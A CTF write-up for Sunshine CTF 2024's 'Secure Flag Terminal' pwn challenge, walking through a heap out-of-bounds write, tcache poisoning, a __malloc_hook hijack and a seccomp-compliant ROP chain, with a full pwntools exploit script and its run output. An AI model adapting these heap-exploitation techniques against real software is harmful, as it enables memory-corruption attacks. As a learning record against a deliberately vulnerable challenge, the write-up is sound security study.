---
title: Sunshine 2024 - Secure Flag Terminal Write-Up
date: 2024-10-20
categories: [CTF, writeup]
tags: [ctf, writeup, Sunshine]     # TAG names should always be lowercase
---

This weekend, I participated in Sunshine CTF 2024 with the Hack@Sec team, and we managed to finish in 12th place and I was able to solve all the challenges in the Pwn category. This is my Write-Up for Secure Flag Terminal, the challenge I enjoyed the most from this CTF.  
It was a Heap Exploitation challenge that I found quite tricky to solve and took me a good while. After reading the flag, I realized that I clearly didn't solve it the intended way, but here's how I did it.  



- **Category:** Pwn.  
- **Points:** 486
- **Solves:** 118 
- **Author:** oreomeister  

## Description
![Challenge](https://raw.githubusercontent.com/elchals/elchals.github.io/main/assets/images/SunshineCTF/challenge1.png)  
Secure Flag Terminal has the typical CTF Heap exploitation challenge menu, where you can allocate a buffer, print its contents, edit its contents, and free the buffer.  
Analyzing the decompiled code with Ghidra, I can see that the first thing the binary does is check if it is being debugged. If it's not, it prints the address of the rand function in libc; if it is, it XORs that address with 0xd3c0dead and prints it. After that, it opens the flag.txt file, duplicates its file descriptor to a random FD, stores the new one in the heap, and closes the original FD. Then, it sets up seccomp with the following configuration:

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000008  if (A != lseek) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x00000000  return KILL
```  
The challenge has all the typical protections:  
```sh
➜  SecureFlag checksec chall_patched                   
[*] '/home/elchals/CTFs/Sunshine/SecureFlag/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
```
The bug is that when you edit the contents of an allocated buffer, you can write up to 0xb4 bytes. Since I control the size of the buffer to allocate, if the allocated buffer is smaller than 0xb4, then there's an OOB (Out-of-Bounds write).  
## Exploitation
Since the challenge uses an older version of GLIBC (GLIBC 2.27), the malloc hooks are available. However, due to the restrictions imposed by seccomp, we can't use them to gain code execution directly with one_gadget or system. What I'm going to do is a ROP (Return-Oriented Programming) chain to print the contents of flag.txt. But since seccomp also blocks the open syscall and all its variants, I'll have to use the FD stored in the heap, which comes with its own issue. I can't simply execute the ROP by exiting the program because, when it terminates, the first thing it does is close the FD stored in the heap. To avoid this, I'll read the FD number from the heap and then overwrite it with an arbitrary value, so that when the program tries to close it on exit, it will attempt to close an invalid FD, allowing me to use the open FD in the ROP to read the flag.  
The binary has a protection, which is more of an annoyance, where when you try to debug it, the libc leak it gives is XORed with a value. There are two ways to handle this: either account for it and, when debugging, XOR it again to get the correct value, or patch the binary to avoid this. I chose to patch it using Ghidra, changing the conditional jump (JNS) to JMP. This way, the XOR will never be executed.  
Since I already have a libc leak, the first thing I'm going to do is get a heap leak. To do this, I allocate several buffers, which I'll later use for Tcache poisoning. I free one of them, reallocate it, and read its contents. This gives me a heap address, and with it, I calculate the heap base.  
I use a size of 0x98, which allocates a buffer of 0xa0 bytes in Tcache. This is large enough to hold the ROP chain, but small enough to overwrite the next chunk using the OOB (Out-of-Bounds) write.  
```py
create(0x98) # 1 
create(0x98) # 2

create(0x98) # 3
create(0x98) # 4

free(4)
free(3)
create(0x98) # 3
read_flag(3)

p.recvline()
p.recvline()
heap = u64(p.recv(6).ljust(8, b'\x00')) - (0x555555a02470 - 0x555555a01000)
print("[i] Heap:", hex(heap))
```
Now, knowing the heap base address and thanks to the OOB (Out-of-Bounds) write, I perform a Tcache poisoning by overwriting the next chunk pointer of one chunk to point to *tcache_perthread_struct*. This struct contains pointers to the head of each tcache bin and also keeps a count of the number of chunks in the tcache for each size.  
This allows me to place an arbitrary pointer in the tcache that I want to be allocated later. I use it to place a pointer to __malloc_hook.  
```py
create(0x98) # 4

free(4)
free(3)
free(2)

payload  = p64(0) * 19
payload += p64(0xa1)
payload += p64(heap + 0x10)

write(1, payload)

create(0x98) # 2
create(0x98) # 3

payload  = p64(0) 
payload += p64(5)
payload  = p64(6) * 16
payload += p64(libc.sym.__malloc_hook)

write(3, payload)
```
Now I can allocate a chunk that overlaps with the malloc hook. I point the malloc hook to puts and use it to obtain a leak of an address from the .text section of the binary. To do this, I simply allocate a new chunk, and then malloc will call puts. When calling the malloc hook, RDI contains the size argument, and since we control the size, we control RDI.  
```py
create(0x98) # 4 Overlaps malloc_hook

text_ptr = libc.address + (0x7ffff7beadb0 - 0x7ffff7800000)
write(4, p64(libc.sym.puts))

free(1)

text_ptr = libc.address + (0x7ffff7beadb0 - 0x7ffff7800000)
create(text_ptr) # 4

p.recvline()
text_base = u64(p.recv(6).ljust(8, b'\x00')) - (0x555555603040 - 0x555555400000)
print("[i] .text:", hex(text_base))
```
The binary keeps track of the allocated buffers in an array of pointers. This array is located in the BSS section of the binary. If I control this array, I gain arbitrary read/write access wherever I want.  
To achieve this, I reuse the chunk I have allocated in *tcache_perthread_struct*. I place a pointer to this array and allocate it.  
```py
storage_array = text_base + (0x555555603060 - 0x555555400000)
print("[i] Strorage:", hex(storage_array))

payload  = p64(0) 
payload += p64(5)
payload  = p64(6) * 16
payload += p64(storage_array)

write(3, p64(0))

free(1)
write(1, payload)

create(0x98)
```
Having control over this array allows me to read/write whatever I want, wherever I want. This means I can now read the file descriptor for flag.txt in the heap, overwrite this FD. Then I obtain a stack leak by reading environ. I write a ROP chain in the main RIP and execute it, ending the program.  
```py
fd_addr = p64(heap + 0x1270)

payload  = fd_addr
payload += p64(libc.sym.environ) 
payload += p64(storage_array) * 2

write(4, payload)

read_flag(1)
p.recvline()
p.recvline()
fd = u64(p.recvline().strip().ljust(8, b'\x00')) 
print("[i] FD:", hex(fd))

write(1, p64(0xdeadbeef))

read_flag(2)
p.recvline()
p.recvline()
stack = u64(p.recv(6).ljust(8, b'\x00')) - (0x7fffffffdcd8 - 0x7fffffffdbe8) - 8
print("[i] Stack:", hex(stack))

payload  = p64(stack) * 4

write(4, payload)

rop_libc = ROP(libc)
pop_rdi  = p64(rop_libc.find_gadget(['pop rdi', 'ret'])[0])
pop_rsi  = p64(rop_libc.find_gadget(['pop rsi', 'ret'])[0])
pop_rdx  = p64(rop_libc.find_gadget(['pop rdx', 'ret'])[0])
binSh    = p64(next(libc.search(b"/bin/sh")))

fd_addr = p64(heap + 0x1270 - 0x68)
writable_addr = p64(heap + 0x2000)

payload  = p64(0)
payload += pop_rdi
payload += p64(fd)
payload += pop_rsi
payload += writable_addr
payload += pop_rdx
payload += p64(0x100)
payload += p64(libc.sym.read)

payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += writable_addr
payload += pop_rdx
payload += p64(0x100)
payload += p64(libc.sym.write)

write(1, payload)
p.sendlineafter(b'option:', b'5')
```
## Final Code
```py
#!/bin/python3
from pwn import *

context.log_level = 'INFO'
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './chall_patched'
elf = context.binary = ELF(process_name)
libc = ELF('./libc.so.6')

HOST = "2024.sunshinectf.games"
PORT = 24002

######################################################################################

gdb_script = f'''
    breakrva 0x1743
    continue
    '''

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT, ssl=False)        
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path])
    return p

def create(size):
    p.sendlineafter(b'option: ', b'1')
    p.sendlineafter(b'-->', str(size).encode())
    
def write(idx, flag):
    p.sendlineafter(b'option: ', b'2')
    p.sendlineafter(b'-->', str(idx).encode())
    p.sendlineafter(b'-->', flag)

def free(idx):
    p.sendlineafter(b'option: ', b'4')
    p.sendlineafter(b'-->', str(idx).encode())

def read_flag(idx):
    p.sendlineafter(b'option: ', b'3')
    p.sendlineafter(b'-->', str(idx).encode())

######################################################################################

p = connect()

p.recvuntil(b'Kernel Seed: ')
libc.address = int(p.recvline().strip(), 16) - libc.sym.rand

print("[i] Libc Base:", hex(libc.address))

create(0x98) # 1 
create(0x98) # 2

create(0x98) # 3
create(0x98) # 4

free(4)
free(3)
create(0x98) # 3
read_flag(3)

p.recvline()
p.recvline()
heap = u64(p.recv(6).ljust(8, b'\x00')) - (0x555555a02470 - 0x555555a01000)
print("[i] Heap:", hex(heap))

create(0x98) # 4

free(4)
free(3)
free(2)

payload  = p64(0) * 19
payload += p64(0xa1)
payload += p64(heap + 0x10)

write(1, payload)

create(0x98) # 2
create(0x98) # 3

payload  = p64(0) 
payload += p64(5)
payload  = p64(6) * 16
payload += p64(libc.sym.__malloc_hook)

write(3, payload)

create(0x98) # 4 Overlaps malloc_hook

text_ptr = libc.address + (0x7ffff7beadb0 - 0x7ffff7800000)
write(4, p64(libc.sym.puts))

free(1)

text_ptr = libc.address + (0x7ffff7beadb0 - 0x7ffff7800000)
create(text_ptr) # 4

p.recvline()
text_base = u64(p.recv(6).ljust(8, b'\x00')) - (0x555555603040 - 0x555555400000)
print("[i] .text:", hex(text_base))

storage_array = text_base + (0x555555603060 - 0x555555400000)
print("[i] Strorage:", hex(storage_array))

payload  = p64(0) 
payload += p64(5)
payload  = p64(6) * 16
payload += p64(storage_array)

write(3, p64(0))

free(1)
write(1, payload)

create(0x98)

fd_addr = p64(heap + 0x1270)

payload  = fd_addr
payload += p64(libc.sym.environ) 
payload += p64(storage_array) * 2

write(4, payload)

read_flag(1)
p.recvline()
p.recvline()
fd = u64(p.recvline().strip().ljust(8, b'\x00')) 
print("[i] FD:", hex(fd))

write(1, p64(0xdeadbeef))

read_flag(2)
p.recvline()
p.recvline()
stack = u64(p.recv(6).ljust(8, b'\x00')) - (0x7fffffffdcd8 - 0x7fffffffdbe8) - 8
print("[i] Stack:", hex(stack))

payload  = p64(stack) * 4

write(4, payload)

rop_libc = ROP(libc)
pop_rdi  = p64(rop_libc.find_gadget(['pop rdi', 'ret'])[0])
pop_rsi  = p64(rop_libc.find_gadget(['pop rsi', 'ret'])[0])
pop_rdx  = p64(rop_libc.find_gadget(['pop rdx', 'ret'])[0])
binSh    = p64(next(libc.search(b"/bin/sh")))

fd_addr = p64(heap + 0x1270 - 0x68)
writable_addr = p64(heap + 0x2000)

payload  = p64(0)
payload += pop_rdi
payload += p64(fd)
payload += pop_rsi
payload += writable_addr
payload += pop_rdx
payload += p64(0x100)
payload += p64(libc.sym.read)

payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += writable_addr
payload += pop_rdx
payload += p64(0x100)
payload += p64(libc.sym.write)

write(1, payload)
p.sendlineafter(b'option:', b'5')


######################################################################################

p.interactive()
```
## Ending
```sh
➜  SecureFlag ./exploit.py REMOTE
[*] '/home/elchals/CTFs/Sunshine/SecureFlag/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
[*] '/home/elchals/CTFs/Sunshine/SecureFlag/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
[*] Connecting to 2024.sunshinectf.games : 24002
[+] Opening connection to 2024.sunshinectf.games on port 24002: Done
[i] Libc Base: 0x76ac7ba4b000
[i] Heap: 0x620ae2344000
[i] .text: 0x620ae2000000
[i] Strorage: 0x620ae2203060
[i] FD: 0x133
[i] Stack: 0x7ffe12ccade0
[*] Loaded 199 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
 
Invalid choice... do better
sun{H0us3_Of_F0rcE_w1th_4_fUn_tW!$t}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```
Looking at the obtained flag, it’s clear that the intended way was to use the House of Force technique and not how I solved it.  
